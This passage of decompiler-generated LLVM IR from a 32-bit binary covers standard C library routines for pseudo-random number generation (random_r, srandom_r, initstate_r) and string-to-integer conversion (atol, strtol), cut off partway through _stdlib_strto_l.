  %v3_80513cd = inttoptr i32 %v2_80513cd to i32*
  store i32 %v11_80513b6, i32* %v3_80513cd, align 4
  %v0_80513d0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80513d0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513d0 = add i32 %v1_80513d0, 16
  %v3_80513d0 = inttoptr i32 %v2_80513d0 to i32*
  store i32 %v0_80513d0, i32* %v3_80513d0, align 4
  %v0_80513d3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80513d3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513d3 = add i32 %v1_80513d3, 20
  %v3_80513d3 = inttoptr i32 %v2_80513d3 to i32*
  store i32 %v0_80513d3, i32* %v3_80513d3, align 4
  br i1 %v1_80513c4, label %dec_label_pc_80513ee, label %dec_label_pc_80513d8

dec_label_pc_80513d8:                             ; preds = %dec_label_pc_80513bd
  %v0_80513d8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80513d8 = add i32 %v0_80513d8, -4
  %v2_80513d8 = inttoptr i32 %v1_80513d8 to i32*
  %v3_80513d8 = load i32, i32* %v2_80513d8, align 4
  %v1_80513db = ashr i32 %v3_80513d8, 31
  %v0_80513dc = load i32, i32* %edi.global-to-local, align 4
  %v2_80513dc = zext i32 %v3_80513d8 to i64
  %v4_80513dc = zext i32 %v1_80513db to i64
  %v5_80513dc = mul nuw i64 %v4_80513dc, 4294967296
  %v6_80513dc = or i64 %v5_80513dc, %v2_80513dc
  %v7_80513dc = zext i32 %v0_80513dc to i64
  %v8_80513dc = sdiv i64 %v6_80513dc, %v7_80513dc
  %v9_80513dc = trunc i64 %v8_80513dc to i32
  %v2_80513de = mul i32 %v9_80513dc, 4
  %v3_80513de = add i32 %v2_80513de, %v0_80513d8
  %v1_80513e1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80513e1 = add i32 %v1_80513e1, %v9_80513dc
  store i32 %v2_80513e1, i32* %eax.global-to-local, align 4
  %v1_80513e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513e3 = add i32 %v1_80513e3, 4
  %v3_80513e3 = inttoptr i32 %v2_80513e3 to i32*
  store i32 %v3_80513de, i32* %v3_80513e3, align 4
  %v0_80513e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80513e6 = ashr i32 %v0_80513e6, 31
  %v0_80513e7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_80513e7 = zext i32 %v0_80513e6 to i64
  %v4_80513e7 = zext i32 %v1_80513e6 to i64
  %v5_80513e7 = mul nuw i64 %v4_80513e7, 4294967296
  %v6_80513e7 = or i64 %v5_80513e7, %v2_80513e7
  %v7_80513e7 = zext i32 %v0_80513e7 to i64
  %v8_80513e7 = sdiv i64 %v6_80513e7, %v7_80513e7
  %v9_80513e7 = trunc i64 %v8_80513e7 to i32
  store i32 %v9_80513e7, i32* %eax.global-to-local, align 4
  %v10_80513e7 = srem i64 %v6_80513e7, %v7_80513e7
  %v11_80513e7 = trunc i64 %v10_80513e7 to i32
  %v0_80513e9 = load i32, i32* %esi.global-to-local, align 4
  %v2_80513e9 = mul i32 %v11_80513e7, 4
  %v3_80513e9 = add i32 %v2_80513e9, %v0_80513e9
  %v1_80513ec = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513ec = inttoptr i32 %v1_80513ec to i32*
  store i32 %v3_80513e9, i32* %v2_80513ec, align 4
  br label %dec_label_pc_80513ee

dec_label_pc_80513ee:                             ; preds = %dec_label_pc_80513bd, %dec_label_pc_80513d8
  %v0_80513ee = load i32, i32* %esi.global-to-local, align 4
  %v1_80513ee = load i32, i32* %ecx.global-to-local, align 4
  %v2_80513ee = mul i32 %v1_80513ee, 4
  %v3_80513ee = add i32 %v2_80513ee, %v0_80513ee
  %v1_80513f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513f1 = add i32 %v1_80513f1, 24
  %v3_80513f1 = inttoptr i32 %v2_80513f1 to i32*
  store i32 %v3_80513ee, i32* %v3_80513f1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80513f6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80513f6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513f6 = add i32 %v1_80513f6, 8
  %v3_80513f6 = inttoptr i32 %v2_80513f6 to i32*
  store i32 %v0_80513f6, i32* %v3_80513f6, align 4
  %v0_8051410.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051409

dec_label_pc_80513fb:                             ; preds = %dec_label_pc_80513ad
  %v1_80513fb = call i32 @__errno_location(i32 %v0_805137b)
  %v1_8051400 = inttoptr i32 %v1_80513fb to i32*
  store i32 22, i32* %v1_8051400, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051409

dec_label_pc_8051409:                             ; preds = %dec_label_pc_80513ee, %dec_label_pc_80513fb
  %v0_8051410 = phi i32 [ %v0_8051410.pre, %dec_label_pc_80513ee ], [ -1, %dec_label_pc_80513fb ]
  store i32 %v0_805137b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051410

; uselistorder directives
  uselistorder i32 %v11_80513b6, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051409, { 1, 0 }
  uselistorder label %dec_label_pc_80513ee, { 1, 0 }
  uselistorder label %dec_label_pc_80513ad, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8051414 = load i32, i32* @ebx, align 4
  store i32 %v0_8051414, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_805141d = add i32 %tmp3, 12
  %v2_805141d = inttoptr i32 %v1_805141d to i32*
  %v3_805141d = load i32, i32* %v2_805141d, align 4
  %v4_805141d = icmp eq i32 %v3_805141d, 0
  %v1_8051421 = add i32 %tmp3, 8
  %v2_8051421 = inttoptr i32 %v1_8051421 to i32*
  %v3_8051421 = load i32, i32* %v2_8051421, align 4
  store i32 %v3_8051421, i32* %esi.global-to-local, align 4
  %v1_8051424 = icmp eq i1 %v4_805141d, false
  br i1 %v1_8051424, label %dec_label_pc_805143d, label %dec_label_pc_8051426

dec_label_pc_8051426:                             ; preds = %entry
  %v2_8051426 = inttoptr i32 %v3_8051421 to i32*
  %v3_8051426 = load i32, i32* %v2_8051426, align 4
  %v5_8051426 = mul i32 %v3_8051426, 1103515245
  %v1_805142c = add i32 %v5_8051426, 12345
  %v1_8051431 = urem i32 %v1_805142c, -2147483648
  store i32 %v1_8051431, i32* %eax.global-to-local, align 4
  store i32 %v1_8051431, i32* %v2_8051426, align 4
  %v0_8051438 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051438 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051438 = inttoptr i32 %v1_8051438 to i32*
  store i32 %v0_8051438, i32* %v2_8051438, align 4
  br label %dec_label_pc_8051468

dec_label_pc_805143d:                             ; preds = %entry
  %v1_805143d = add i32 %tmp3, 4
  %v2_805143d = inttoptr i32 %v1_805143d to i32*
  %v3_805143d = load i32, i32* %v2_805143d, align 4
  store i32 %v3_805143d, i32* %ecx.global-to-local, align 4
  %v2_8051440 = load i32, i32* %arg1, align 4
  store i32 %v2_8051440, i32* %edx.global-to-local, align 4
  %v1_8051442 = add i32 %tmp3, 24
  %v2_8051442 = inttoptr i32 %v1_8051442 to i32*
  %v3_8051442 = load i32, i32* %v2_8051442, align 4
  store i32 %v3_8051442, i32* %edi.global-to-local, align 4
  %v1_8051445 = inttoptr i32 %v3_805143d to i32*
  %v2_8051445 = load i32, i32* %v1_8051445, align 4
  store i32 %v2_8051445, i32* %eax.global-to-local, align 4
  %v1_8051447 = inttoptr i32 %v2_8051440 to i32*
  %v2_8051447 = load i32, i32* %v1_8051447, align 4
  %v4_8051447 = add i32 %v2_8051447, %v2_8051445
  store i32 %v4_8051447, i32* %v1_8051447, align 4
  %v0_8051449 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051449 = inttoptr i32 %v0_8051449 to i32*
  %v2_8051449 = load i32, i32* %v1_8051449, align 4
  %v1_805144b = add i32 %v0_8051449, 4
  store i32 %v1_805144b, i32* %edx.global-to-local, align 4
  %v2_805144e = udiv i32 %v2_8051449, 2
  %v1_8051450 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051450 = icmp ult i32 %v1_805144b, %v1_8051450
  %v1_8051452 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051452 = inttoptr i32 %v1_8051452 to i32*
  store i32 %v2_805144e, i32* %v2_8051452, align 4
  %v0_8051455 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051455 = add i32 %v0_8051455, 4
  store i32 %v1_8051455, i32* %eax.global-to-local, align 4
  br i1 %v7_8051450, label %dec_label_pc_805145e, label %dec_label_pc_805145a

dec_label_pc_805145a:                             ; preds = %dec_label_pc_805143d
  %v0_805145a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805145a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051463

dec_label_pc_805145e:                             ; preds = %dec_label_pc_805143d
  %v1_805145e = load i32, i32* %edi.global-to-local, align 4
  %v7_805145e = icmp ult i32 %v1_8051455, %v1_805145e
  %v1_8051460 = icmp eq i1 %v7_805145e, false
  %v3_8051460 = load i32, i32* %esi.global-to-local, align 4
  %v4_8051460 = select i1 %v1_8051460, i32 %v3_8051460, i32 %v1_8051455
  store i32 %v4_8051460, i32* %eax.global-to-local, align 4
  %v0_8051463.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051463

dec_label_pc_8051463:                             ; preds = %dec_label_pc_805145a, %dec_label_pc_805145e
  %v0_8051463 = phi i32 [ %v0_805145a, %dec_label_pc_805145a ], [ %v0_8051463.pre, %dec_label_pc_805145e ]
  %v1_8051463 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051463 = inttoptr i32 %v1_8051463 to i32*
  store i32 %v0_8051463, i32* %v2_8051463, align 4
  %v0_8051465 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051465 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051465 = add i32 %v1_8051465, 4
  %v3_8051465 = inttoptr i32 %v2_8051465 to i32*
  store i32 %v0_8051465, i32* %v3_8051465, align 4
  br label %dec_label_pc_8051468

dec_label_pc_8051468:                             ; preds = %dec_label_pc_8051426, %dec_label_pc_8051463
  %v2_8051468 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051468, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8051431, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051468, { 1, 0 }
  uselistorder label %dec_label_pc_8051463, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_805146f = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051473 = load i32, i32* @edi, align 4
  %v0_8051474 = load i32, i32* @esi, align 4
  %v0_8051475 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8051481 = add i32 %tmp14, 12
  %v2_8051481 = inttoptr i32 %v1_8051481 to i32*
  %v3_8051481 = load i32, i32* %v2_8051481, align 4
  store i32 %v3_8051481, i32* %ecx.global-to-local, align 4
  %v6_8051487 = icmp ugt i32 %v3_8051481, 4
  br i1 %v6_8051487, label %dec_label_pc_8051501, label %dec_label_pc_8051489

dec_label_pc_8051489:                             ; preds = %entry
  %v1_8051489 = add i32 %tmp14, 8
  %v2_8051489 = inttoptr i32 %v1_8051489 to i32*
  %v3_8051489 = load i32, i32* %v2_8051489, align 4
  store i32 %v3_8051489, i32* %ebx.global-to-local, align 4
  %v1_805148c = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8051493 = select i1 %v1_805148c, i32 1, i32 %arg1
  store i32 %v3_8051493, i32* %edx.global-to-local, align 4
  %v1_8051496 = icmp eq i32 %v3_8051481, 0
  %v2_8051498 = inttoptr i32 %v3_8051489 to i32*
  store i32 %v3_8051493, i32* %v2_8051498, align 4
  br i1 %v1_8051496, label %dec_label_pc_80514ff, label %dec_label_pc_805149c

dec_label_pc_805149c:                             ; preds = %dec_label_pc_8051489
  %v0_805149c = load i32, i32* @esi, align 4
  %v1_805149c = add i32 %v0_805149c, 16
  %v2_805149c = inttoptr i32 %v1_805149c to i32*
  %v3_805149c = load i32, i32* %v2_805149c, align 4
  store i32 %v3_805149c, i32* %eax.global-to-local, align 4
  %v0_805149f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805149f, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_80514a6 = sext i32 %v3_805149c to i64
  store i64 %v4_80514a6, i64* %stack_var_-40, align 8
  %v5_80514dc32 = icmp sgt i32 %v3_805149c, 1
  br i1 %v5_80514dc32, label %dec_label_pc_80514ab, label %dec_label_pc_80514de

dec_label_pc_80514ab:                             ; preds = %dec_label_pc_805149c, %dec_label_pc_80514ab.dec_label_pc_80514ab_crit_edge
  %v0_80514d3 = phi i32 [ %v0_80514d3.pre, %dec_label_pc_80514ab.dec_label_pc_80514ab_crit_edge ], [ %v0_805149f, %dec_label_pc_805149c ]
  %v0_80514ab = load i32, i32* %edx.global-to-local, align 4
  %v1_80514b2 = ashr i32 %v0_80514ab, 31
  %v2_80514b3 = zext i32 %v0_80514ab to i64
  %v4_80514b3 = zext i32 %v1_80514b2 to i64
  %v5_80514b3 = mul nuw i64 %v4_80514b3, 4294967296
  %v6_80514b3 = or i64 %v5_80514b3, %v2_80514b3
  %v8_80514b3 = sdiv i64 %v6_80514b3, 127773
  %v9_80514b3 = trunc i64 %v8_80514b3 to i32
  %v10_80514b3 = srem i64 %v6_80514b3, 127773
  %v3_80514b9 = mul nsw i64 %v10_80514b3, 16807
  %v4_80514b9 = trunc i64 %v3_80514b9 to i32
  %tmp24 = mul i32 %v9_80514b3, -2836
  %v2_80514c5 = add i32 %v4_80514b9, %tmp24
  %v1_80514c7 = add i32 %v2_80514c5, 1
  %v6_80514c7 = xor i32 %v2_80514c5, -2147483648
  %v7_80514c7 = xor i32 %v1_80514c7, %v2_80514c5
  %v8_80514c7 = and i32 %v7_80514c7, %v6_80514c7
  %v9_80514c7 = icmp slt i32 %v8_80514c7, 0
  %v10_80514c7 = icmp eq i32 %v1_80514c7, 0
  %v11_80514c7 = icmp slt i32 %v1_80514c7, 0
  %v1_80514ca = add i32 %v2_80514c5, 2147483647
  store i32 %v1_80514ca, i32* %eax.global-to-local, align 4
  %v3_80514d0 = icmp ne i1 %v11_80514c7, %v9_80514c7
  %v4_80514d0 = or i1 %v10_80514c7, %v3_80514d0
  %v7_80514d0 = select i1 %v4_80514d0, i32 %v1_80514ca, i32 %v2_80514c5
  store i32 %v7_80514d0, i32* %edx.global-to-local, align 4
  %v1_80514d3 = add i32 %v0_80514d3, 4
  store i32 %v1_80514d3, i32* %ecx.global-to-local, align 4
  %v2_80514d6 = inttoptr i32 %v1_80514d3 to i32*
  store i32 %v7_80514d0, i32* %v2_80514d6, align 4
  %v0_80514d8 = load i32, i32* @edi, align 4
  %v1_80514d8 = add i32 %v0_80514d8, 1
  store i32 %v1_80514d8, i32* @edi, align 4
  %v3_80514d9.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_80514d9.pre to i32
  %v5_80514dc = icmp slt i32 %v1_80514d8, %extract.t11
  br i1 %v5_80514dc, label %dec_label_pc_80514ab.dec_label_pc_80514ab_crit_edge, label %dec_label_pc_80514d9.dec_label_pc_80514de_crit_edge

dec_label_pc_80514ab.dec_label_pc_80514ab_crit_edge: ; preds = %dec_label_pc_80514ab
  %v0_80514d3.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80514ab

dec_label_pc_80514d9.dec_label_pc_80514de_crit_edge: ; preds = %dec_label_pc_80514ab
  %v0_80514de.pre = load i32, i32* @esi, align 4
  %v0_80514e1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80514de

dec_label_pc_80514de:                             ; preds = %dec_label_pc_80514d9.dec_label_pc_80514de_crit_edge, %dec_label_pc_805149c
  %v0_80514e1 = phi i32 [ %v0_80514e1.pre, %dec_label_pc_80514d9.dec_label_pc_80514de_crit_edge ], [ %v0_805149f, %dec_label_pc_805149c ]
  %v0_80514de = phi i32 [ %v0_80514de.pre, %dec_label_pc_80514d9.dec_label_pc_80514de_crit_edge ], [ %v0_805149c, %dec_label_pc_805149c ]
  %v1_80514de = add i32 %v0_80514de, 20
  %v2_80514de = inttoptr i32 %v1_80514de to i32*
  %v3_80514de = load i32, i32* %v2_80514de, align 4
  store i32 %v3_80514de, i32* %eax.global-to-local, align 4
  %v2_80514e1 = add i32 %v0_80514de, 4
  %v3_80514e1 = inttoptr i32 %v2_80514e1 to i32*
  store i32 %v0_80514e1, i32* %v3_80514e1, align 4
  %v0_80514e4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80514e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80514e4 = mul i32 %v1_80514e4, 4
  %v3_80514e4 = add i32 %v2_80514e4, %v0_80514e4
  store i32 %v3_80514e4, i32* %eax.global-to-local, align 4
  %v1_80514e7 = load i32, i32* @esi, align 4
  %v2_80514e7 = inttoptr i32 %v1_80514e7 to i32*
  store i32 %v3_80514e4, i32* %v2_80514e7, align 4
  %v3_80514e9 = load i64, i64* %stack_var_-40, align 8
  %v6_80514e9 = mul nsw i64 %v3_80514e9, 10
  %v7_80514e9 = trunc i64 %v6_80514e9 to i32
  %v2_80514ef = ptrtoint i32* %stack_var_-20 to i32
  %v1_80514fc25 = add i32 %v7_80514e9, -1
  %v9_80514fc29 = icmp slt i32 %v1_80514fc25, 0
  store i32 %v1_80514fc25, i32* @ebx, align 4
  %v1_80514fd30 = icmp eq i1 %v9_80514fc29, false
  br i1 %v1_80514fd30, label %dec_label_pc_80514ef, label %dec_label_pc_80514ff

dec_label_pc_80514ef:                             ; preds = %dec_label_pc_80514de, %dec_label_pc_80514ef
  store i32 %v2_80514ef, i32* %eax.global-to-local, align 4
  %v0_80514f4 = load i32, i32* @esi, align 4
  %v2_80514f5 = inttoptr i32 %v0_80514f4 to i32*
  %v3_80514f5 = call i32 @__GI_random_r(i32* %v2_80514f5, i32 %v2_80514ef)
  store i32 %v0_80514f4, i32* %eax.global-to-local, align 4
  store i32 %v2_80514ef, i32* %edx.global-to-local, align 4
  %v0_80514fc.pre = load i32, i32* @ebx, align 4
  %v1_80514fc = add i32 %v0_80514fc.pre, -1
  %v9_80514fc = icmp slt i32 %v1_80514fc, 0
  store i32 %v1_80514fc, i32* @ebx, align 4
  %v1_80514fd = icmp eq i1 %v9_80514fc, false
  br i1 %v1_80514fd, label %dec_label_pc_80514ef, label %dec_label_pc_80514ff

dec_label_pc_80514ff:                             ; preds = %dec_label_pc_80514de, %dec_label_pc_80514ef, %dec_label_pc_8051489
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051501

dec_label_pc_8051501:                             ; preds = %entry, %dec_label_pc_80514ff
  %v0_8051508 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80514ff ]
  store i32 %v0_8051475, i32* @ebx, align 4
  store i32 %v0_8051474, i32* @esi, align 4
  store i32 %v0_8051473, i32* @edi, align 4
  store i32 %v0_805146f, i32* @ebp, align 4
  ret i32 %v0_8051508

; uselistorder directives
  uselistorder i32 %v1_80514fc, { 1, 0 }
  uselistorder i32 %v0_80514de, { 1, 0 }
  uselistorder i32 %v1_80514c7, { 2, 1, 0 }
  uselistorder i32 %v2_80514c5, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_805149f, { 1, 0, 2 }
  uselistorder i32 %v3_8051481, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8051501, { 1, 0 }
  uselistorder label %dec_label_pc_80514ff, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80514ef, { 1, 0 }
  uselistorder label %dec_label_pc_80514ab, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805150b = load i32, i32* @esi, align 4
  %v0_805150c = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_805152d, label %dec_label_pc_8051521

dec_label_pc_8051521:                             ; preds = %entry
  %v2_8051521 = icmp ult i32 %arg3, 256
  %v1_8051528 = select i1 %v2_8051521, i32 5, i32 4
  store i32 %v1_8051528, i32* @ebx, align 4
  br label %dec_label_pc_8051543

dec_label_pc_805152d:                             ; preds = %entry
  %v6_8051530 = icmp ugt i32 %arg3, 31
  br i1 %v6_8051530, label %dec_label_pc_805153b, label %dec_label_pc_8051532

dec_label_pc_8051532:                             ; preds = %dec_label_pc_805152d
  store i32 0, i32* @ebx, align 4
  %v6_8051537 = icmp ugt i32 %arg3, 7
  br i1 %v6_8051537, label %dec_label_pc_8051543, label %dec_label_pc_8051593

dec_label_pc_805153b:                             ; preds = %dec_label_pc_805152d
  %v2_805153b = icmp ult i32 %arg3, 64
  %v1_8051540 = select i1 %v2_805153b, i32 3, i32 2
  store i32 %v1_8051540, i32* @ebx, align 4
  br label %dec_label_pc_8051543

dec_label_pc_8051543:                             ; preds = %dec_label_pc_8051532, %dec_label_pc_8051521, %dec_label_pc_805153b
  %v0_805154d = phi i32 [ 0, %dec_label_pc_8051532 ], [ %v1_8051528, %dec_label_pc_8051521 ], [ %v1_8051540, %dec_label_pc_805153b ]
  %v1_8051543 = mul nuw nsw i32 %v0_805154d, 4
  %v2_8051543 = add i32 %v1_8051543, ptrtoint (i32* @global_var_8057fb4.215 to i32)
  %v3_8051543 = inttoptr i32 %v2_8051543 to i32*
  %v4_8051543 = load i32, i32* %v3_8051543, align 4
  store i32 %v4_8051543, i32* %eax.global-to-local, align 4
  %v1_805154a = add i32 %tmp7, 4
  store i32 %v1_805154a, i32* @esi, align 4
  %v2_805154d = add i32 %v1_8051543, ptrtoint (i32* @global_var_8057fa0.216 to i32)
  %v3_805154d = inttoptr i32 %v2_805154d to i32*
  %v4_805154d = load i32, i32* %v3_805154d, align 4
  store i32 %v4_805154d, i32* %edx.global-to-local, align 4
  %v2_8051554 = add i32 %arg4, 12
  %v3_8051554 = inttoptr i32 %v2_8051554 to i32*
  store i32 %v0_805154d, i32* %v3_8051554, align 4
  %v0_8051557 = load i32, i32* @esi, align 4
  %v1_8051557 = load i32, i32* @edi, align 4
  %v2_8051557 = add i32 %v1_8051557, 8
  %v3_8051557 = inttoptr i32 %v2_8051557 to i32*
  store i32 %v0_8051557, i32* %v3_8051557, align 4
  %v0_805155a = load i32, i32* %eax.global-to-local, align 4
  %v1_805155a = load i32, i32* @edi, align 4
  %v2_805155a = add i32 %v1_805155a, 16
  %v3_805155a = inttoptr i32 %v2_805155a to i32*
  store i32 %v0_805155a, i32* %v3_805155a, align 4
  %v0_805155d = load i32, i32* @esi, align 4
  %v1_805155d = load i32, i32* %eax.global-to-local, align 4
  %v2_805155d = mul i32 %v1_805155d, 4
  %v3_805155d = add i32 %v2_805155d, %v0_805155d
  store i32 %v3_805155d, i32* %eax.global-to-local, align 4
  %v0_8051560 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051560 = load i32, i32* @edi, align 4
  %v2_8051560 = add i32 %v1_8051560, 20
  %v3_8051560 = inttoptr i32 %v2_8051560 to i32*
  store i32 %v0_8051560, i32* %v3_8051560, align 4
  %v0_8051563 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051563 = load i32, i32* @edi, align 4
  %v2_8051563 = add i32 %v1_8051563, 24
  %v3_8051563 = inttoptr i32 %v2_8051563 to i32*
  store i32 %v0_8051563, i32* %v3_8051563, align 4
  %v0_8051566 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_805156b = inttoptr i32 %v0_8051566 to i32*
  %v3_805156b = call i32 @srandom_r(i32 %arg1, i32* %v2_805156b)
  %v0_8051570 = load i32, i32* @ebp, align 4
  %v1_8051570 = inttoptr i32 %v0_8051570 to i32*
  store i32 0, i32* %v1_8051570, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805157b = load i32, i32* @ebx, align 4
  %v1_805157b = icmp eq i32 %v0_805157b, 0
  br i1 %v1_805157b, label %dec_label_pc_80515ac, label %dec_label_pc_805157f

dec_label_pc_805157f:                             ; preds = %dec_label_pc_8051543
  %v0_805157f = load i32, i32* @edi, align 4
  %v1_805157f = add i32 %v0_805157f, 4
  %v2_805157f = inttoptr i32 %v1_805157f to i32*
  %v3_805157f = load i32, i32* %v2_805157f, align 4
  %v1_8051582 = load i32, i32* @esi, align 4
  %v2_8051582 = sub i32 %v3_805157f, %v1_8051582
  %v2_8051584 = sdiv i32 %v2_8051582, 4
  %v3_8051587 = mul i32 %v2_8051584, 5
  %v2_805158a = add i32 %v3_8051587, %v0_805157b
  %v1_805158c = load i32, i32* @ebp, align 4
  %v2_805158c = inttoptr i32 %v1_805158c to i32*
  store i32 %v2_805158a, i32* %v2_805158c, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515ac

dec_label_pc_8051593:                             ; preds = %dec_label_pc_8051532
  %v1_8051593 = call i32 @__errno_location(i32 %v0_805150c)
  store i32 %v1_8051593, i32* %eax.global-to-local, align 4
  %v1_8051598 = inttoptr i32 %v1_8051593 to i32*
  store i32 22, i32* %v1_8051598, align 4
  %v0_805159e = load i32, i32* %stack_var_-36, align 4
  %v1_805159e = call i32 @__errno_location(i32 %v0_805159e)
  %v1_80515a3 = inttoptr i32 %v1_805159e to i32*
  store i32 22, i32* %v1_80515a3, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515ac

dec_label_pc_80515ac:                             ; preds = %dec_label_pc_8051543, %dec_label_pc_805157f, %dec_label_pc_8051593
  %v0_80515b3 = phi i32 [ 0, %dec_label_pc_8051543 ], [ 0, %dec_label_pc_805157f ], [ -1, %dec_label_pc_8051593 ]
  store i32 %v0_805150b, i32* @esi, align 4
  ret i32 %v0_80515b3

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80515ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051543, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80515bf = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_80515bf
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80515d9 = inttoptr i32 %arg1 to i8*
  %v5_80515d9 = call i32 @_stdlib_strto_l(i8* %v4_80515d9, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80515d9
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80515e7 = load i32, i32* @ebx, align 4
  store i32 %v0_80515e7, i32* %stack_var_-16, align 4
  %v4_80515eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80515eb, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_80515f3 = load i32, i32* @global_var_8059dd8, align 8
  store i32 %v0_80515f3, i32* %edx.global-to-local, align 4
  store i32 %v4_80515eb, i32* %ebx.global-to-local, align 4
  %v2_80515fe41 = load i8, i8* %arg1, align 1
